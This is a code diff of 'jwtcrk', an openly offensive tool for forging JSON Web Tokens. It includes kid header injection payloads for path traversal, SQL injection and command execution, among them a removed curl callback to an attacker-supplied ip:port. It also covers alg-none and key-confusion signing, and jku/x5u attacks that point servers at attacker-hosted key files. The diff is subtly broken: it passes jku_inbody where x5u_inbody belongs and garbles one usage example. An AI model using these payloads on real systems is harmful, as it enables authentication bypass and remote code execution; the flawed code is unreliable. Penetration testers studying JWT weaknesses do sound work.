@@ -80,7 +80,7 @@ class Cracker:
         Optional:
         -a --alg <alg>             [The algorithm; None, none, HS256, RS256.]
         -k --key <path>            [The path to the key if it's needed.]
-        -p --payload <key:value>   [The field you want to change in the payload.]
+        -p --payload <key:value>   [The claim you want to change in the payload. key:value]
            --remove-from <sec:key> [A key to remove from a section (header or payload) of
                                     the token.]
            --add-into <sec:key>    [Same as --remove-from but add. This is needed since for some
@@ -90,62 +90,61 @@ class Cracker:
                                     the new header, so you should run an attack that will process
                                     that header.]
         -d --decode                [Decode the token and quit.]
-           --complex-payload <key#key#...>:<value,...>
+           --complex-payload <key,key...>:<value,...>
                                    [An options to change payload subclaims. If you can access a claim
                                     with one key, use --payload. Else, if you need to go deeper in
                                     the payload object, use this options passing the keys and the
-                                    values as a key:value pair. The keys must be separated by '#',
+                                    values as a key:value pair. The keys must be separated by ',',
                                     while the value will usually be only one. If you want to inject
-                                    a list of values, pass them as comma separated ones.]
+                                    a list of values, separates also them with commas.]
            --unverified            [Act as the host does not verify the signature.]
-           --auto-try <hostname>   [If it's present the script will retrieve the key
-                                    using openssl. If the host uses this key to signs
-                                    its token, it will work.]
+           --auto-try <hostname>   [Retrieve the key from the host ssl certs.]
            --specify-key <string>  [A string used as key.]
-           --inject-kid <exploit>  [Try to inject a payload in the kid header; dirtrv, sqli or rce.
-                                    If you select rce as payload, please make sure to start a nc
-                                    listener (see --kid-curl-info).]
+           --inject-kid <exploit>  [Try to inject a payload in the kid header; dirtrv, sqli or rce.]
            --kid-curl-info <ip:port>
                                    [If you select rce payload in --inject-kid, the script will
                                     insert a curl payload in the kid header. With this option you
                                     tell the script the ip/domain and the port to wich make a curl
                                     request.]
-           --exec-via-kid <cmd>    [Obviously curl could be not installed on the server, or you may
-                                    need to test another payload to verify rce. In such cases you
-                                    should use --exec-via-kid and write the command to append in the
-                                    kid header. Remember to enquote the command if it contains
-                                    spaces.]
-           --jku-basic <yourURL>   [Basic jku injection. jku attacks are complicated, you need
-                                    some configs. You have to host the jwks.json crafted file
-                                    on your pc or on a domain you own. Pass it to this parameter,
-                                    but don't force a path; jwks have a common path, pass only
-                                    the first part of the url, '/.well-known/jwks.json' will be
-                                    automatically appended. Look at the examples for more details.]
+           --exec-via-kid <cmd>    [Default rce payload provided by --inject kid may not work.
+                                    In such cases you should use --exec-via-kid and write the command
+                                    to append in the kid header. Remember to enquote the command if
+                                    it contains spaces.]
+           --jku-basic <yourURL>   [Basic jku injection. The tool will return a jwks file that you have
+                                    to host on a server you own. Except for cases where you passed the
+                                    --manual option, the tool will append '/.well-known/jwks.json' to
+                                    the url specified, so be sure to place the file on you server under
+                                    this path. Do not submit the token before the file is reachable on
+                                    your server.]
            --jku-redirect <mainURL,yourURl>
                                    [Try to use an open redirect to make the jku header pointing to
                                     your url. To do this you need to specify the exact place in
-                                    the main url, where your url has to be attached. This is done
-                                    with the keyword HERE. Look at the examples for more details.]
+                                    the main url, where your url has to be placed. This is done
+                                    with the HERE keyword. Look at the examples for more details.
+                                    '/.well-known/jwks.json' will be appended to your url.]
            --jku-inbody <mainURL>  [Try to exploit an http header injection to inject the jwks in
                                     the http response of the url. Use the HERE keyword to let the
-                                    tool know where to inject the jwks.]
+                                    tool know where to inject the jwks. The tool won't return any
+                                    file since jwks will be injected in the response body.
+                                    '/.well-known/jwks.json' will be appended to you url.]
            --x5u-basic <yourURL>   [Same as --jku-basic but with x5u header. The x5u allow to link
                                     an url to a jwks file containing a certificate. The tool will
-                                    generate a certificate an wiil craft a proper jwks file.]
-           --x5u-inbody <mainURL>  [Same as --jku-body but with x5u header.]
+                                    generate a certificate an will craft a proper jwks file.]
+           --x5u-inbody <mainURL>  [Same as --jku-inbody but with x5u header.]
            --manual                [This bool flag allow you to manually craft an url for the jku
                                     or x5u header, if used with --jku-basic or --x5u-basic.
                                     This is needed since in some situations, automatic options
-                                    could be a limit. So if you need to pass a defined url, pass
+                                    could be a limit. So if you need to define different urls, use
                                     this option, and to the url you specified in --jku-basic or
                                     --x5u-basic, the tool won't append anything. This option is not
                                     compatible with other jku/x5u options.]
+           --generate-jwk          [Generate a jwk claim and insert it in the token header.]
 
         Examples:
         jwtcrk <token> --decode
         jwtcrk <token> --alg None --payload <key>:<value>
         jwtcrk <token> --alg HS256 --key <path_to_public.pem> --payload <key>:<value>
-        jwtcrk <token> --alg hs256 --complex-payload <key1#key2#key3>:<value> --unverified
+        jwtcrk <token> --alg hs256 --complex-payload <key1,key,2key3>:<value> --unverified
         jwtcrk <token> --alg RS256 --payload <key>:<value> --jku-basic http://myurl.com
         jwtcrk <token> --alg rs256 -p <key>:<value> --jku-redirect https://example.com?redirect=HERE&foo=bar,https://myurl.com
         jwtcrk <token> --alg rs256 -p <key>:<vaue> --add-into header:x5u --x5u-basic http://myurl.com
@@ -161,7 +160,7 @@ class Cracker:
 {Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
         """
 
-    def __init__(self, token, alg, path_to_key, user_payload, complex_payload, remove_from, add_into, auto_try, kid, kid_curl_info, exec_via_kid,
+    def __init__(self, token, alg, path_to_key, user_payload, complex_payload, remove_from, add_into, auto_try, kid, exec_via_kid,
                  specified_key, jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, unverified=False, decode=False,
                  manual=False, generate_jwk=False):
         """
@@ -169,12 +168,11 @@ class Cracker:
         :param alg: The algorithm for the attack. HS256 or None -> str.
         :param path_to_key: The path to the public.pem, if the alg is HS256 -> str.
         :param user_payload: What the user want to change in the payload -> list.
-        :param complex_payload: A string containins key separated by # to access subclaims -> str
+        :param complex_payload: A string (key:value) containing key separated by , to access subclaims -> str
         :param remove_from: What the user want to delete in the header or in the payload -> list.
         :param add_into: What the user want to add in the header (useless in the payload) -> list.
         :param auto_try: The hostname from which the script try to retrieve a key via openssl -> str.
         :param kid: The type of payload to inject in the kid header. DirTrv, SQLi or RCE -> str.
-        :param kid_curl_info: The ip and the port to use if kid RCE has been selected -> str.
         :param exec_via_kid: A command to append in the kid header -> str.
         :param specified_key: A string set to be used as key -> str.
         :param jku_basic: The main url on which the user want to host the malformed jwks file -> str.
@@ -205,7 +203,6 @@ class Cracker:
         self.add_into = add_into
         self.auto_try = auto_try
         self.kid = kid
-        self.kid_curl_info = kid_curl_info
         self.exec_via_kid = exec_via_kid
         self.specified_key = specified_key
         self.jku_basic = jku_basic
@@ -348,10 +345,6 @@ class Cracker:
                     self.kid = "SQLi"
                     self.key = "zzz"
                 elif self.kid.lower() == "rce":
-                    matching__ip_port_pattern = r'^.+:.*$'
-                    if not self.kid_curl_info or not re.match(matching_ip_port_pattern, self.kid_curl_info):
-                        print(f"{Bcolors.FAIL}jwtcrk: err: Missing or invalid --kid-curl-info. You must specify an ip:port (or ip: if port is 80){Bcolors.ENDC}")
-                        sys.exit(2)
                     self.kid = "RCE"
                     """Command will be executed before the server validates the signature"""
                     self.key = "itdoesnotmatter"
@@ -390,7 +383,7 @@ class Cracker:
                       self.auto_try, self.kid, self.specified_key,
                       self.jku_basic, self.jku_redirect, self.jku_header_injection,
                       self.remove_from, self.x5u_basic, self.x5u_header_injection,
-                      self.add_into, self.kid_curl_info, self.exec_via_kid,
+                      self.add_into, self.exec_via_kid,
         ]
         if any(arg is not None for arg in other_args) or self.unverified or self.manual or self.generate_jwk:
             print(f"{Bcolors.WARNING}jwtcrk: warn: You have not to specify any other argument if you want to decode the token{Bcolors.ENDC}")
@@ -441,7 +434,7 @@ class Cracker:
             if "kid" not in header_dict.keys():
                 print(f"{Bcolors.FAIL}jwtcrk: err: JWT header has no kid{Bcolors.ENDC}")
                 sys.exit(2)
-            header_dict['kid'] += self.inject_kid()
+            header_dict['kid'] += Cracker.inject_kid(self.kid)
         elif self.exec_via_kid:
             if "kid" not in header_dict.keys():
                 print(f"{Bcolors.FAIL}jwtcrk: err: JWT header has no kid{Bcolors.ENDC}")
@@ -712,32 +705,26 @@ class Cracker:
                 ).decode('utf-8').rstrip("=")
         return signature
 
-    def inject_kid(self):
+    @staticmethod
+    def inject_kid(payload):
         """
         A function to test for injections in the kid header.
 
-        Defines a dictionary containing payloads to inject in the key header, and grabs the ones select by the user.
+        :param payload: The payload to select -> str
 
+        Defines a dictionary containing payloads to inject in the key header, and grabs the ones select by the user.
         This function is intended to be updated with new payloads.
 
         :return: The related payload string
 
         """
-        if self.kid_curl_info:
-            ip = self.kid_curl_info.split(":")[0]
-            port = self.kid_curl_info.split(":")[1] if self.kid_curl_info.split(":")[1] else "80"
         kid_payloads = {
             "DirTrv": "../../../../../dev/null",
             "SQLi": "' union select 'zzz",
-            "RCE": f"|curl {ip}:{port} -m 1",
+            "RCE": f"| sleep 15",
         }
 
-        if self.kid == "DirTrv":
-            return kid_payloads['DirTrv']
-        elif self.kid == "SQLi":
-            return kid_payloads['SQLi']
-        elif self.kid == "RCE":
-            return kid_payloads['RCE']
+        return kid_payloads[payload]
 
     @staticmethod
     def check_token(token):
@@ -857,7 +844,7 @@ class Cracker:
         try:
             new_payload = user_input.split(":")
             new_payload_key = new_payload[0]
-            new_payload_value = new_payload[1]
+            new_payload_value = Cracker.build_values(new_payload[1])
         except IndexError:
             print(f"{Bcolors.FAIL}jwtcrk: err: Payload must have this syntax: name:value. You have written '{user_input}'{Bcolors.ENDC}")
             sys.exit(2)
@@ -931,16 +918,16 @@ class Cracker:
     def build_keys(string):
         """
         Build a list of keys
-        :param string: A string containing the kyes, separated by '#' -> str
+        :param string: A string containing the kyes, separated by ',' -> str
 
         The function first check for the separator, and quits out if is not present. Then split the string and check for
         integers ones.
 
         :return: The list of keys, or None if separator is not present in string
         """
-        if "#" not in string:
+        if "," not in string:
             return None
-        keys = string.split("#")
+        keys = string.split(",")
         for i in range(len(keys)):
             try:
                 keys[i] = int(keys[i])
@@ -970,7 +957,7 @@ class Cracker:
     @staticmethod
     def change_payload_complex(string, iterable):
         """
-        :param string: A key:value pair where key is a set of keys separated by #, and values by commas -> str
+        :param string: A key:value pair where key is a set of keys and value a set of values or a single one -> str
         :param iterable: The payload dictionary -> dict
 
         The function calls build_keys and build_values, passing them the rith part of the string (splitted by ':').
@@ -979,10 +966,10 @@ class Cracker:
 
         :return: The modified payload dictionary
         """
-        keys = Cracker.build_keys(string.split(":")[0].strip("#"))
+        keys = Cracker.build_keys(string.split(":")[0].strip(","))
         vals = Cracker.build_values(string.split(":")[1].lstrip(","))
         if keys is None:
-            print(f"{Bcolors.FAIL}jwt: err: Can't split keys basing on '#'. If you can access the claim using a single key, pleas use --payload{Bcolors.ENDC}")
+            print(f"{Bcolors.FAIL}jwt: err: Can't split keys basing on ','. If you can access the claim using a single key, pleas use --payload{Bcolors.ENDC}")
             sys.exit(2)
         i = 0
         for key in keys:
@@ -1125,80 +1112,76 @@ if __name__ == '__main__':
                         metavar="<algorithm>", required=False
                         )
     parser.add_argument("-k", "--key",
-                        help="The path to the public key file",
+                        help="The path to the key file",
                         metavar="<path_to_key>", required=False
                         )
     parser.add_argument("-p", "--payload",
                         action="append", nargs="+",
-                        help="The field you want to change in the payload as key:value pairs",
+                        help="A claim you want to change in the payload and the value to issue, as key:value pairs. If value have to be a list, pass list items as comma separated values.",
                         metavar="<key>:<value>", required=False
                         )
     parser.add_argument("-d", "--decode", action="store_true",
-                        help="Just decode the token and quit.",
+                        help="Just decode the token and quit",
                         required=False
                         )
     parser.add_argument("--complex-payload", action="append", nargs="+",
-                        help="Acces subclaims. Pass keys (separated by '#', in the write order) and values (separated by ',' if more than one) as key:values pairs.",
-                        metavar="<key#key...>:<value>", required=False
+                        help="As --payload but for subclaims. Keys must be comma separated, and passed in cronological order. If value have to be a list, pass the list items as comma separated values",
+                        metavar="<key,key...>:<value>", required=False
                         )
     parser.add_argument("--remove-from", action="append", nargs="+",
-                        help="The section of the token, and the key name to delete as key:value pairs",
+                        help="The section of the token and the key of the item to delete, as key:value pairs",
                         metavar="<section>:<key>", required=False,
                         )
     parser.add_argument("--add-into", action="append", nargs="+",
-                        help="The section of the token, and the key name to add as key:value pairs",
+                        help="The section of the token and the key of the item to add as key:value pairs",
                         metavar="<section>:<key>", required=False
                         )
     parser.add_argument("--unverified", action="store_true",
-                        help="Treat the host as it doesn't verify the signature",
+                        help="Server does not verify the signature",
                         required=False
                         )
     parser.add_argument("--auto-try",
-                        help="Try to use a key retrieved from the host ssl certs",
+                        help="Retrieve public key from the host ssl cert",
                         metavar="<domain>", required=False
                         )
     parser.add_argument("--inject-kid",
-                        help="Try for kid injection. Choose a valid payload (DirTrv, SQLi)",
+                        help="The payload to inject in the kid header (SQLi, DirTrv, RCE)",
                         metavar="<payload>", required=False
                         )
-    parser.add_argument("--kid-curl-info",
-                        help="Specify ip:port (or 'ip:' if port is 80) to send a request to",
-                        metavar="<ip>:<port>", required=False
-                        )
     parser.add_argument("--exec-via-kid",
-                        help="Specify a system command to be injected in the kid, to try to execute it on the server",
+                        help="A system command to be injected in the kid (if default RCE does not work)",
                         metavar="<command>", required=False
                         )
     parser.add_argument("--specify-key",
-                        help="Specify a string to be used as key", metavar="<key>",
+                        help="A string to be used as password for sign the token", metavar="<key>",
                         required=False
                         )
     parser.add_argument("--jku-basic",
-                        help="Specify your ip or domain to host the jwks.json file. '/.well-known/jwks.json' is automatically appended",
+                        help="The ip/domain where you will host the jwks file. '/.well-known/jwks.json' is automatically appended",
                         metavar="<yourURL>", required=False
                         )
     parser.add_argument("--jku-redirect",
-                        help="Specify the url vulnerable to Open Redirect, use the HERE keyword replacing the redirect url, and your one as comma separated values. './well-known/jwks.json' is automatically appended to your url",
+                        help="The url vulnerable to Open Redirect and your one, as comma separated values. Replace the redirect url with the HERE keyword. './well-known/jwks.json' is automatically appended to your url",
                         metavar="<mainURL,yourURL>", required=False
                         )
     parser.add_argument("--jku-inbody",
-                        help="Specify the url vulnerable to header injection, use the HERE keyword to tell the tool where to inject, and your one as comma separated values. './well-known/jwks.json' is automatically appended to your url",
+                        help="The url vulnerable to HTTP header injection and your one, as comma separated values. Append the HERE keyword to the vulnerable parameter of the url query string. './well-known/jwks.json' is automatically appended to your url",
                         metavar="<mainURL>", required=False
                         )
     parser.add_argument("--x5u-basic",
-                        help="Specify your ip or domain to host the jwks.json file. '/.well-known/jwks.json' is automatically appended",
+                        help="The ip/domain where you will host the jwks.json file. '/.well-known/jwks.json' is automatically appended",
                         metavar="<yourURL>", required=False
                         )
     parser.add_argument("--x5u-inbody",
-                        help="Specify the url vulnerable to header injection, use the HERE keyword to tell the tool where to inject, and your one as comma separated values. './well-known/jwks.json' is automatically appended to your url",
+                        help="The url vulnerable to HTTP header injection and your one, as comma separated values. Append the HERE keyword to the vulnerable parameter of the url query string './well-known/jwks.json' is automatically appended to your url",
                         metavar="<mainURL>", required=False
                         )
     parser.add_argument("--manual", action="store_true",
-                        help="Use this flag with jku/x5u basic if you need to craft an url without the tool appending or replaceing anything to it",
+                        help="Tool won't append '/.well-known/jwks.json' to your url. Use this flag only with --jku-basic and --x5u-basic",
                         required=False
                         )
     parser.add_argument("--generate-jwk", action="store_true",
-                       help="Generate a jwk and insert it in the token header",
+                       help="Generate a jwk claim and insert it in the token header",
                        required=False
                         )
 
@@ -1207,8 +1190,8 @@ if __name__ == '__main__':
 
     cracker = Cracker(
         args.token, args.alg, args.key, args.payload, args.complex_payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid,
-        args.kid_curl_info, args.exec_via_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic,
-        args.x5u_inbody, args.unverified, args.decode, args.manual, args.generate_jwk,
+        args.exec_via_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic, args.jku_inbody,
+        args.unverified, args.decode, args.manual, args.generate_jwk,
     )
 
     # Start the cracker
